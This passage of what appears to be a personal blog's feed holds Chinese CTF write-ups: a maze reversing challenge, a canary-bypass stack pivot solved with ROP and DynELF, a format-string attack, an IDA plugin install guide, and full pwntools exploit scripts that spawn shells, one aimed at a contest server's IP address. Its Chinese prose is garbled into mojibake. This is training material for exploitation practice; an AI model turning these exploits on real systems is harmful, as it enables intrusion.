:io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def edit(idx,data):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&quot;content&quot;,str(data))payload = &#39;a&#39; * 0x40add(0,0x90,payload)payload = &#39;a&#39; * 0x40 + p64(0) + p64(0xfb1)edit(0,payload)payload = &#39;a&#39; * 0x90for i in range(24):    add(0,0x90,payload)payload = &#39;a&#39; * 0x10add(1,0x90,payload)payload = &#39;a&#39; * 0x70add(0,0x70,payload)payload = &#39;\x00&#39; * 0x18 + p64(0x71) + p64(0x6020C0 + 0x100)edit(1,payload)payload = 0x60 * &#39;a&#39;add(0,0x70,payload)add(0,0x90,payload)payload = p64(0x0000000000602058) + p64(0x90)edit(0,payload)edit(1,p64(elf.plt[&#39;printf&#39;]))sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%7$s&#39; + p64(0x000000000602018)sa(&#39;idx&#39;,payload)r(4)r(4)libc_base = uu64(r(6)) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)sys = libc_base + libc.sym[&#39;system&#39;]sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)payload = &#39;aaaa%82c&#39; + &#39;%8$hhn11&#39; + p64(0x000000000602058)sa(&#39;idx&#39;,payload)edit(1,p64(sys))s(&#39;sh&#39;)itr()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <url>/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"><a href="#å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®"></a>å®‰æ’HWSå¤ä»¤è¥é€‰æ‹”èµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>æ³¨æ„ç½‘å¡é‚£å—ï¼Œè¦å¯¹åº”è‡ªå·±è™šæ‹Ÿæœºç½‘å¡çš„æƒ…å†µã€‚</p><h5 id="å¯åŠ¨å‘½ä»¤ï¼š"><a href="#å¯åŠ¨å‘½ä»¤ï¼š" class="headerlink" title="å¯åŠ¨å‘½ä»¤ï¼š"></a>å¯åŠ¨å‘½ä»¤ï¼š</h5><pre><code class="python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot;  -net nic -net tap</code></pre><h4 id="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"><a href="#æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥" class="headerlink" title="æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥"></a>æŠŠè™šæ‹Ÿæœºä¸­è¦åˆ†æçš„mazeæ–‡ä»¶å–å‡ºæ¥</h4><pre><code class="bash">scp -r /path/maze username@servername:/path </code></pre><h4 id="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"><a href="#ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ" class="headerlink" title="ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ"></a>ä½¿ç”¨ghidraè¿›è¡Œåˆ†æ</h4><pre><code class="bash">  fgets(buf,0x28,_stdin);  len = strlen(buf);  uStack68 = 0x20;  if (*(char *)((int)&amp;uStack68 + len + 3) == &#39;\n&#39;) {    *(undefined *)((int)&amp;uStack68 + len + 3) = 0;    len = len - 1;  }  if (len != 0x20) {    eorr();  }</code></pre><p>è¿™ä¸€æ®µå¯ä»¥ç¡®å®šè®©è¾“å…¥çš„æ˜¯32ä¸ªå­—ç¬¦ã€‚</p><pre><code class="c">void FUN_004006f0(void){  int i;  int j;  i = 0;  while (i &lt; DAT_16) {    j = 0;    while (j &lt; 8) {      maze[i * 8 + j] =           (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt;                 (7U - j &amp; 0x1f));      j = j + 1;    }    i = i + 1;  }  return;}</code></pre><p>å¯ä»¥çœ‹åˆ°è¿·å®«æ˜¯åœ¨è¿è¡Œæ—¶æ ¹æ®éƒ¨åˆ†æ•°æ®ï¼Œæ¥ç”Ÿæˆçš„ã€‚å¹¶ä¸”å…¶ä¸­ä¸€è¡Œæ˜¯8ä¸ªæ•°æ®ï¼Œä¸€åˆ—æ˜¯16ä¸ªï¼Œä¸€å…±128ä¸ªæ•°æ®ã€‚</p><p>å¯ä»¥ä½¿ç”¨gdbï¼Œæ–­ç‚¹åœ¨è¿™ä¸ªå‡½æ•°ä¹‹åï¼ŒæŠŠè¿·å®«æå–å‡ºæ¥ã€‚æå–å‡ºæ¥çš„éƒ½æ˜¯0x1 å’Œ 0x0<br>ç»„æˆçš„è¿·å®«ã€‚</p><p>è¿›å…¥æ§åˆ¶èµ°ä½çš„å‡½æ•°ï¼š</p><pre><code class="c">  heng = 1;  shu = 0;  pcStackX0 = param_1</code></pre><p>è¿™ä¸ªåœ°æ–¹æ§åˆ¶è¯´ï¼Œèµ·å…ˆèµ·ç‚¹æ˜¯ç¬¬1è¡Œçš„ç¬¬2ä¸ªä½ç½®ã€‚</p><p>checkå‡½æ•°ï¼Œä¸»è¦æ˜¯çœ‹ä½ æ˜¯ä¸æ˜¯åœ¨ç§»åŠ¨åï¼Œèµ°åˆ°äº†0ä¸Šï¼Œèµ°åˆ°çš„è¯ï¼Œç¨‹åºå°±åˆ¤ä½ å¤±è´¥ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œå‘ç°ä¸»è¦åˆ¤æ–­ï¼š</p><pre><code class="c">          if (cVar1 != &#39;U&#39;) {LAB_00400ad4:            if ((heng == 1) &amp;&amp; (shu == 10)) {              uVar3 = 1;            }            else {              uVar3 = 0;            }</code></pre><p>åœ¨è¿™ä¸€æ®µï¼Œå¯ä»¥ç¡®å®šèµ°åˆ°ç¬¬11åˆ—çš„ç¬¬2ä¸ªæ•°å­—å³å¯ã€‚</p><h4 id="æå–è¿·å®«å›¾å¹¶å¤„ç†"><a href="#æå–è¿·å®«å›¾å¹¶å¤„ç†" class="headerlink" title="æå–è¿·å®«å›¾å¹¶å¤„ç†"></a>æå–è¿·å®«å›¾å¹¶å¤„ç†</h4><h5 id="è„šæœ¬æå–"><a href="#è„šæœ¬æå–" class="headerlink" title="è„šæœ¬æå–"></a>è„šæœ¬æå–</h5><pre><code class="c">data=&quot;AMz1nG~#--Ma7e~&quot;data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1]maze=[]lie=0while lie&lt;15:    hang=0    while hang&lt;8:        # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f))        hang+=1    lie+=1print(maze)</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>å°±è¿™è¿·å®«ï¼Œæˆ‘çœ‹äº†å¥½ä¸€ä¼šæ‰èƒ½èµ°å¥½ã€‚ğŸ¤£ğŸ¤£æœäº†è‡ªå·±ï¼Œè€ä»¥ä¸ºæ˜¯æ•°æ®æå–é”™äº†ã€‚</p><pre><code class="bash">flag = md5{DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU}</code></pre><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><h5 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h5><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥æ³„æ¼ã€‚</li><li>æ ˆæº¢å‡ºï¼Œåªèƒ½1ä¸ªgadgetã€‚</li></ul><h5 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h5><h6 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h6><p>åªèƒ½æº¢å‡ºä¸€ä¸ªgadgetï¼Œè‚¯å®šæ˜¯æ‰“æ ˆè¿ç§»ï¼Œä½†æ˜¯è·Ÿä»¥å¾€çš„æ ˆè¿ç§»ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€ä¸ªgadgetåªèƒ½æº¢å‡ºåˆ°rbpï¼Œå¹¶ä¸èƒ½è¦†ç›–åˆ°ret addressï¼Œæ‰€ä»¥åªèƒ½è¦†ç›–å¥½rbpåï¼Œåˆ©ç”¨ç¨‹åºèµ°å‡ºè¿™ä¸ªå‡½æ•°åï¼Œå°†è¦ç»“æŸç¨‹åºæ—¶çš„<code>leave ret</code> ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å› ä¸ºåœ¨èµ°è¿‡ä¸€æ¬¡ <code>leave ret</code>æ—¶ï¼Œæ­¤æ—¶çš„rbpå·²ç»è¢«æ”¹äº†ï¼Œå†è¿‡ç¨‹åºçš„ç¬¬äºŒä¸ªleave ret å‰ï¼Œéœ€è¦è¿‡ä¸€ä¸‹canaryçš„æ£€æµ‹:</p><pre><code class="bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (&#39;8&#39;)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (&#39;x&#39;)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre><p>çœ‹è¿™é‡Œï¼Œåœ¨å–æ•°å€¼æ—¶ï¼Œå…¶åœ¨ä½ è¿ç§»çš„bssæ®µè¯»å–æ•°å€¼åˆ°rdxè¿›è¡Œåˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡å¾€bssæ®µè¯»çš„æ—¶å€™ï¼Œå¡«å……å¥½canaryçš„å€¼ã€‚</p><p>å¹¶ä¸”è¿™ä¸ªé¢˜ï¼Œåœ¨çœ‹gotè¡¨åˆ°bssæ®µçš„è·ç¦»ä¹Ÿæ˜¯å¾ˆè¿‘çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>æ‰€ä»¥åœ¨è¿ç§»çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä»æœ‰å®é™…æ„ä¹‰çš„å‡½æ•°ï¼ˆæ¯”å¦‚putsï¼‰å¼€å§‹å‰å°±å¾—æŠŠæ ˆæŠ¬é«˜ã€‚å¦åˆ™åœ¨è¿›å…¥libcçš„å†…éƒ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šå› ä¸ºå„ç§push pop è€Œä¿®æ”¹åˆ°gotå¤„çš„ä¸œè¥¿ï¼Œå¯¼è‡´ä¸ä»…æ³„æ¼çš„æ•°å€¼æœ‰é—®é¢˜ï¼Œå¹¶ä¸”å®¹æ˜“è®©ç¨‹åºå´©æ‰ã€‚</p><pre><code class="bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()</code></pre><p>æ­¤å¤„å°±å¯ä»¥æ³„æ¼å‡ºputså‡½æ•°çš„libcåœ°å€ï¼Œä½†æ˜¯ç”±äºå‡ºé¢˜äººæƒ³è€ƒå¯Ÿ<code>ret2dl_runtime_resolve</code>,æ‰€ä»¥åº”è¯¥æ˜¯é­”æ”¹äº†libcã€‚</p><p>ç„¶åå¯ä»¥ä½¿ç”¨DynELFæ¥æå®šï¼Œå‚è€ƒç¾¤é‡Œå¸ˆå‚…åˆ†äº«çš„expã€‚</p><h6 id="Dynelfå‡½æ•°æ€ä¹ˆå†™"><a href="#Dynelfå‡½æ•°æ€ä¹ˆå†™" class="headerlink" title="Dynelfå‡½æ•°æ€ä¹ˆå†™"></a>Dynelfå‡½æ•°æ€ä¹ˆå†™</h6><p>ç”±äºç¨‹åºåªæœ‰putså‡½æ•°æ¥è¾“å‡ºï¼Œå°±ç”¨putså‡½æ•°æ¥è¿›è¡Œæ³„æ¼ã€‚</p><pre><code class="python">payload = p64(0) * 57 +p64(canary) * 2  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre><p>æœ¬æ¥æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯å‘ç°ç¨‹åºè¿˜æ˜¯ä¼šå´©ï¼Œç”±äºç¨‹åºæƒ…å†µçš„é™åˆ¶ï¼Œæ ˆåªèƒ½æé«˜<code>0x1b0</code>è¿™æ ·ï¼Œè¿˜æ˜¯ä¸å¤Ÿç”¨ã€‚</p><p>è¿˜æ˜¯å°±æƒ³åŠæ³•æå‡æ ˆï¼Œå¾€é«˜ç‚¹çš„bssä¸Šå†™å…¥ropè¿›è¡Œæƒ³è¦çš„æ“ä½œã€‚</p><p>è¿™ä¸ªå°±åœ¨Dynelfå‰å†™å¥½,ç”¨ropæ§åˆ¶å‚æ•°ï¼Œè°ƒç”¨readå‡½æ•°æ¥å¾€é«˜ç‚¹çš„bssæ®µè¿›è¡Œå†™payloadï¼Œå¹¶ä¸”æœ€åç”¨pop rspçš„æ“ä½œï¼ŒæŠŠå†™å¥½rop chainçš„bssçš„åœ°å€pop åˆ°rspä¸Šï¼Œç„¶åå†retä¸Šå»ï¼š</p><pre><code class="python">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()</code></pre><p>æ¥ç€å°±æ˜¯ç”¨è¿™å†™å¥½å¥½çš„rop chainï¼Œè¿›è¡Œæ³„æ¼åœ°å€ï¼Œä¸ºäº†Dynelfå¤šæ¬¡è°ƒç”¨æ³„æ¼ï¼Œåœ¨æ³„æ¼åœ°å€åï¼Œè·Ÿä¸Šreadå‡½æ•°ç»§ç»­å¾€è¿™æ®µåœ°å€ä¸Šè¯»å–åŒæ ·çš„rop chainï¼Œç„¶åå†æ¬¡æ§åˆ¶rspï¼Œæ¥ç€retåˆ°å¯¹åº”çš„ä½ç½®ï¼š</p><pre><code class="python">def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data</code></pre><p>å¯ä»¥çœ‹åˆ°æ˜¯æé«˜äº†0x500ä¸ªå­—èŠ‚çš„åœ°æ–¹è¿›è¡Œropï¼Œåšå¥½ç”¨æ§åˆ¶rspï¼Œretåè¿›è¡Œåå¤æ¨ªè·³è·ƒï¼Œå®Œæˆå¯¹system çš„å¯»æ‰¾ã€‚æ„Ÿè§‰è¿™æ˜¯å¾ˆå¥½çš„åŠæ³•ï¼Œå› ä¸ºæ ˆè¿ç§»çš„æ ¸å¿ƒè¿˜æ˜¯æ§åˆ¶rspï¼Œæœ€åˆå­¦ä¹ æ˜¯è§è¿‡2æ¬¡æ ˆè¿ç§»çš„é¢˜ç›®ï¼Œå½“æ—¶ç”¨çš„è¿˜æ˜¯leave ret æ¥è¿›è¡Œçš„æ§åˆ¶ï¼Œç°åœ¨çœ‹åˆ°ç›´æ¥ä½¿ç”¨pop rsp æ¥æ§åˆ¶ï¼Œçš„ç¡®æ˜¯æ–¹ä¾¿åˆç®€å•çš„åŠæ³•ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *# from LibcSearcher import *s = process(&quot;./pwn&quot;)# s = remote(&quot;183.129.189.61&quot;,54900)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level=&#39;debug&#39;def debug():    # gdb.attach(proc.pidof(s)[0],gdbscript=&#39;b main&#39;)    gdb.attach(s)    pause()pop_rdi = 0x0000000000400963pop_rsi_r15 = 0x0000000000400961pop_rsp_3 = 0x000000000040095dleave_ret = 0x00000000004007dccontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]read_plt = elf.plt[&#39;read&#39;]bss = 0x6010a0s.sendafter(&quot;canary &#39; s @ # $ % ^ &amp; * :\n&quot;, &quot;%9$p&quot;)canary = int(s.recvline(keepends=False), 16)success(hex(canary))context.arch = &#39;amd64&#39;def vuln(address):    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)    s.recvline(timeout=0.07)    s.send(payload)    count = 0    up = &quot;&quot;    buf = &#39;&#39;    while True:        c = s.recv(numb=1, timeout=0.07)        count += 1        if up == &#39;\n&#39; and c == &quot;&quot;:              buf = buf[:-1]                        buf += &quot;\x00&quot;            break        else:            buf += c            up = c    data = buf[:8]    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datadebug()payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)s.recvline()puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(&#39;system&#39;,&#39;libc&#39;)success(hex(system))payload = p64(pop_rdi)+p64(0x6010a0+0x100+8*11)+p64(system)s.send(payload)s.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOSå®‰è£…IDAæ’ä»¶keypatch</title>
    <link href="/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <url>/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/</url>
    
    <content type="html"><![CDATA[<h1 id="MacOSå®‰è£…IDAæ’ä»¶keypatch"><a href="#MacOSå®‰è£…IDAæ’ä»¶keypatch" class="headerlink" title="MacOSå®‰è£…IDAæ’ä»¶keypatch"></a>MacOSå®‰è£…IDAæ’ä»¶keypatch</h1><p>macOS å®‰è£…å®˜æ–¹ä»‹ç»çš„å®‰è£…æ–¹å¼ä¸å¤ªè¡Œã€‚ç½‘ä¸Šå‚è€ƒåè®°å½•ä¸€ä¸‹ã€‚</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><pre><code class="bash">brew install cmake</code></pre><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><pre><code class="bash">git clone https://github.com/fjh658/keystone-engine.gitcd keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre><p>æ­¤æ—¶åœ¨å®‰è£…åçš„æœ€åå‡ æ®µä»£ç ä¸­ï¼Œæ‰¾åˆ°ç±»ä¼¼ï¼š</p><pre><code class="bash">/Library/Python/2.7/site-packages/keystone</code></pre><p>è¿™æ˜¯æœ¬åœ°python2.7çš„è·¯å¾„ã€‚</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><pre><code class="bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre><pre><code class="bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre><p>ç°å®æ‹’ç»çš„è¯ï¼Œå¯ä»¥</p><pre><code class="bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre><pre><code class="bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre><p>ç„¶åè¿›å…¥idaä½¿ç”¨å³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(7th)</title>
    <link href="/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <url>/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-7th"><a href="#DASCTFå®‰æ’æœˆèµ›-7th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(7th)"></a>DASCTFå®‰æ’æœˆèµ›(7th)</h1><p>åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚</p><h2 id="è™šå‡çš„ç­¾åˆ°é¢˜"><a href="#è™šå‡çš„ç­¾åˆ°é¢˜" class="headerlink" title="è™šå‡çš„ç­¾åˆ°é¢˜"></a>è™šå‡çš„ç­¾åˆ°é¢˜</h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‡ºé¢˜äººä¼°è®¡æ˜¯ç”¨äº†GCC&gt;=4.9ç‰ˆæœ¬ï¼Œæ•…æ„ç»™è¿™ä¸ªStack Buffer Overflow è®¾ç½®éš¾åº¦ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code> 0x80485fd &lt;main+104&gt;:        mov    ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;:        leave 0x8048601 &lt;main+108&gt;:        lea    esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;:        ret</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨å¯¹æ ˆçš„ä¿å­˜ä¸Šï¼Œé¢å¤–ä½¿ç”¨äº† ecx æ¥ä¿å­˜æ ˆä¸Šçš„æŸä¸ªå€¼ã€‚å¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥overflowäº† espï¼Œé‚£ä¹ˆä¼šé€ æˆå¥‡æ€ªçš„å½±å“ã€‚</p><p>è¯•ç€åˆ†æä¸€ä¸‹ï¼š</p><ul><li>æƒ³è¦æ§åˆ¶espï¼Œå°±å¾—æ§åˆ¶ecx</li><li>æƒ³è¦æ§åˆ¶ecxï¼Œå°±å¾—è‡³å°‘æ§åˆ¶åˆ°ebp-0x4çš„ä½ç½®</li></ul><p>ç”±äºæ˜¯getsçš„è·å–è¾“å…¥ï¼Œè¿™ä¸ªæ˜æ˜¾å¾ˆå®¹æ˜“å®ç°ã€‚</p><p>æ ¸å¿ƒå°±æ˜¯è®©ï¼š</p><pre><code>[ [ebp-0x4] - 0x4] = address(backdoor)</code></pre><p>é™„ä¸ŠæˆåŠŸæ—¶æ ˆæƒ…å†µ,æ–­ç‚¹åœ¨0x80485fd ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>ç”±äºæ ˆéšæœºåŒ–ï¼Œå…¶ä¸­éœ€è¦ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼<code>[ebp-0x4]</code>ï¼Œæ¥è·å–åœ¨<br>ebp-0x4çš„ä½ç½®å¡«å…¥ä»€ä¹ˆå€¼åˆé€‚ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./qiandao&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10013)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()one = 0x804857D# debug()payload = &#39;%13$p&#39;sla(&#39;name&#39;,payload)ru(&#39;0x&#39;)key = int(r(8),16) - 0x40 + 0x8info_addr(&#39;key&#39;,key)payload = p32(one)*9 + p32(key)sla(&quot;?&quot;,payload)itr()</code></pre><p>å¤šè°ƒè¯•ï¼Œä¼šæ›´å®¹æ˜“ç†è§£ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFæš‘å‡åˆ·é¢˜(1)</title>
